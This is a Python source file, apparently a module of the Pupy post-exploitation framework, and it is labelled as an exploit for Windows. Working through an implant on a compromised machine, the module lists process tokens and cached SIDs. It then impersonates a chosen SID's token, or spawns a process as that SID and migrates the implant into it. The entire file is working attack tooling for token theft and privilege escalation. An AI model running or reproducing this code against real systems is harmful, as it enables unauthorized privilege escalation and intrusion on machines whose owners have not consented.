# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupy.modules.lib.windows.migrate import migrate
from pupy.pupylib.PupyOutput import Table, MultiPart

__class_name__="ImpersonateModule"

@config(compat="windows", category="exploit")
class ImpersonateModule(PupyModule):
    """ list/impersonate process tokens """

    dependencies=["pupwinutils.security"]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="impersonate", description=cls.__doc__)
        cls.arg_parser.add_argument("-l", "--list", action='store_true', help="list available Sids")
        cls.arg_parser.add_argument("-i", "--impersonate", metavar="SID", help="impersonate a sid")
        cls.arg_parser.add_argument("-m", "--migrate", action="store_true", help="spawn a new process and migrate into it")
        cls.arg_parser.add_argument("-r", "--rev2self", action='store_true', help="call rev2self")

    def run(self, args):
        if args.list:
            ListCachedSids = self.client.remote(
                'pupwinutils.security', 'ListCachedSids')
            ListSids = self.client.remote('pupwinutils.security', 'ListSids')

            cached = ListCachedSids()
            sids = ListSids()

            process_table = []
            sids_table = []
            sids_dict = {}

            for (pid, process, sid, username) in sids:
                process_table.append({
                    'pid': pid,
                    'process': process,
                    'sid': sid,
                    'username': username
                })

                sids_dict[sid] = username

            for sid, username in sids_dict.items():
                sids_table.append({
                    'sid': sid,
                    'username': username
                })

            for (sid, username) in cached:
                sids_table.append({
                    'sid': sid + ' (CACHED)',
                    'username': username
                })

            self.log(MultiPart([
                Table(process_table, [
                    'pid', 'process', 'username', 'sid'
                ], caption='Process table'),

                Table(sids_table, [
                    'sid', 'username'
                ], caption='Available Sids')
            ]))

        elif args.impersonate:
            if args.migrate:
                create_proc_as_sid = self.client.remote('pupwinutils.security', 'create_proc_as_sid', False)

                proc_pid = create_proc_as_sid(args.impersonate)
                migrate(self, proc_pid, keep=True)
            else:
                impersonate_sid_long_handle = self.client.remote(
                    'pupwinutils.security', 'impersonate_sid_long_handle', False)

                self.client.impersonated_dupHandle = impersonate_sid_long_handle(args.impersonate, close=False)

            self.success('Sid {} impersonated !'.format(args.impersonate))

        elif args.rev2self:
            rev2self = self.client.remote('pupwinutils.security', 'rev2self', False)

            rev2self()
            self.client.impersonated_dupHandle = None
            self.success('rev2self called')

        else:
            self.error('no option supplied')
